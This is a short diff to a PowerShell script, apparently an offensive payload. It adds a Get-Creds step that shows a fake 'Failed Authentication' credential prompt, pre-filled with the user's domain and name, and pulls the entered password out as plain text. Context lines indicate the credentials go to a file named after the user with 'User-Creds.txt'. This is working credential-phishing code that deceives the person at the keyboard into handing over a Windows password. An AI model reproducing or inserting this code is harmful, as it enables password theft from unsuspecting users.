@@ -52,7 +52,9 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 #>
 
 function Get-Creds {
-
+$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
+        $cred.getnetworkcredential().password
+	
     $form = $null
 
     while ($form -eq $null)
